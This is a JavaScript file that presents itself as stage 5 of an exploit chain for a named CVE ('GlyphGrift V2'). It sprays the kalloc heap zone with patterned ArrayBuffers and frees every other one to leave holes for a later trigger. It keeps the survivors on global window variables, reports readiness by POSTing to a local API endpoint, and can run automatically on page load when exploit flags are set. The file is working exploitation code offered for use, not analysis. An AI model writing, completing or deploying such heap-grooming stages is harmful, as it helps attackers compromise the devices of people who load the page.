/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 5 heap spray.
 * Fills target kalloc zone with ArrayBuffers, frees every other slot for holes,
 * then POSTs /api/glyphgrift-heap-ready. Survivors stay on window for post-trigger.
 */
(function () {
  'use strict';

  var SPRAY_COUNT = 4096;
  var HOLE_INTERVAL = 2;
  var TARGET_SIZE = 128; /* kalloc.128 primary (USER DECIDED larger DX) */
  var API = '/api/glyphgrift-heap-ready';

  function fillPattern(buf, marker) {
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < u8.length; i++) {
      u8[i] = (marker + i) & 0xff;
    }
  }

  function runSpray(targetSize) {
    var size = targetSize || TARGET_SIZE;
    var allocSize = Math.max(16, size - 16);
    var spray = [];
    var i;
    for (i = 0; i < SPRAY_COUNT; i++) {
      spray[i] = new ArrayBuffer(allocSize);
      fillPattern(spray[i], i & 0xff);
    }

    var holeCount = 0;
    for (i = 0; i < spray.length; i += HOLE_INTERVAL) {
      spray[i] = null;
      holeCount++;
    }

    /* Force some GC pressure without claiming collection completed */
    try {
      var junk = [];
      for (i = 0; i < 64; i++) junk.push(new ArrayBuffer(64 * 1024));
      junk = null;
    } catch (e) {}

    window.__L0FCK_GLYPHGRIFT_SPRAY = spray;
    window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE = size;
    window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC = allocSize;
    window.__L0FCK_GLYPHGRIFT_HOLE_COUNT = holeCount;

    return {
      sprayed: SPRAY_COUNT,
      holes: holeCount,
      target_zone: size,
      phase: 'holes_ready',
      heap_spray_ready: true
    };
  }

  function postReady(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx) {
    var size = window.__L0FCK_GLYPHGRIFT_ZONE || TARGET_SIZE;
    if (ctx && ctx.log) ctx.log('glyphgrift heap spray zone=' + size);
    var payload = runSpray(size);
    return postReady(payload).then(function () {
      if (ctx && ctx.report) {
        return ctx.report('glyphgrift_heap_spray', 'ok', JSON.stringify(payload));
      }
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_heap_spray = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_SPRAY = function (zone) {
    if (zone) window.__L0FCK_GLYPHGRIFT_ZONE = zone;
    return execute(null);
  };

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_SPRAY === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();
